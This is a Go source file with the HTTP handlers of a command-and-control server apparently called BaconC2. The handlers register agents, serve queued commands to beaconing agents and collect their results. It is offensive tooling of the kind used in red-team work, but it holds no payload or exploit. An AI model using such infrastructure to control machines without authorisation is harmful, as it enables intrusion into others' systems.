package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	local_models "github.com/RabbITCybErSeC/BaconC2/server/models"
	"github.com/RabbITCybErSeC/BaconC2/server/store"
	"github.com/gin-gonic/gin"
)

// AgentHandler handles agent-related operations
type AgentHandler struct {
	agentStore   store.IAgentStore
	commandQueue queue.IServerCommandQueue
	engine       *gin.Engine
}

// NewAgentHandler initializes a new AgentHandler
func NewAgentHandler(agentStore store.IAgentStore, commandQueue queue.IServerCommandQueue, engine *gin.Engine) *AgentHandler {
	return &AgentHandler{
		agentStore:   agentStore,
		commandQueue: commandQueue,
		engine:       engine,
	}
}

// GinEngine returns the Gin engine
func (h *AgentHandler) GinEngine() *gin.Engine {
	return h.engine
}

// handleRegister handles agent registration
func (h *AgentHandler) handleRegister(c *gin.Context) {
	var agent local_models.ServerAgentModel
	var incomingAgent models.Agent

	if err := c.ShouldBindJSON(&incomingAgent); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	fmt.Println(incomingAgent)

	agent.LastSeen = time.Now()
	agent.IsActive = true
	agent.Commands = []local_models.AgentCommand{}
	agent.BaseAgentModel = incomingAgent
	agent.BaseAgentModel.Protocol = "http"

	if err := h.agentStore.Register(&agent); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{"status": "registered"})
}

// handleBeacon handles agent beaconing
func (h *AgentHandler) handleBeacon(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	_, err := h.agentStore.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	if err := h.agentStore.UpdateLastSeen(agentID); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	cmd, hasCommand := h.commandQueue.Get(agentID)
	agentCmd := local_models.AgentCommand{AgentID: agentID, Command: cmd}
	if hasCommand {
		if err := h.agentStore.UpdateAgentCommands(agentID, agentCmd); err != nil {
			fmt.Printf("Error updating agent commands: %v\n", err)
		}
		c.JSON(http.StatusOK, gin.H{
			"command":    cmd,
			"nextBeacon": 10, // Recommend beaconing again in 10 seconds
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"status":     "acknowledged",
		"nextBeacon": 10, // Default beacon interval
	})
}

// handleCommandResult handles command results from agents
func (h *AgentHandler) handleCommandResult(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	var result local_models.AgentCommand
	if err := c.ShouldBindJSON(&result); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	_, err := h.agentStore.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	if err := h.agentStore.UpdateAgentCommands(agentID, result); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "received"})
}

// handleAddCommand handles adding a new command for an agent
func (h *AgentHandler) handleAddCommand(c *gin.Context) {
	var cmd models.Command
	if err := c.ShouldBindJSON(&cmd); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	_, err := h.agentStore.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	cmd.Status = "pending"
	cmd.ID = fmt.Sprintf("%d", time.Now().UnixNano())

	if err := h.commandQueue.Add(agentID, cmd); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "queued", "id": cmd.ID})
}
